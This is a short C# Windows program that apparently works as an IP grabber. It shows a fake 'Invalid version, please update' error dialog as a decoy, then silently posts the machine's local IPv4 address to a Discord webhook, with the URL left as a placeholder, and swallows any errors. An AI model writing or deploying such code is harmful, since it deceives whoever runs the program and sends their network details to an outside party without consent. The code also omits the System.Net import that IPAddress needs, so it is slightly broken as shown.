using System;
using System.Linq;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

class Program
{
    [STAThread]
    static void Main()
    {
        MessageBox.Show("Invalid version, please update to v22.4", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
        SendLocalIPv4ToWebhook().Wait();
    }

    static async Task SendLocalIPv4ToWebhook()
    {
        try
        {
            string localIPv4 = GetLocalIPv4();
            string webhookUrl = "https://discord.com/api/webhooks/YOUR WEBHOOK";

            using (var client = new HttpClient())
            {
                var json = $"{{\"content\": \"Local IPv4: {localIPv4}\"}}";
                var content = new StringContent(json, Encoding.UTF8, "application/json");
                await client.PostAsync(webhookUrl, content);
            }
        }
        catch
        {
         
        }
    }

    static string GetLocalIPv4()
    {
        foreach (NetworkInterface ni in NetworkInterface.GetAllNetworkInterfaces())
        {
            if (ni.OperationalStatus == OperationalStatus.Up)
            {
                var ipProps = ni.GetIPProperties();

                foreach (var addr in ipProps.UnicastAddresses)
                {
                    if (addr.Address.AddressFamily == AddressFamily.InterNetwork &&
                        !IPAddress.IsLoopback(addr.Address))
                    {
                        return addr.Address.ToString();
                    }
                }
            }
        }
        return "No IPv4 address found";
    }
}
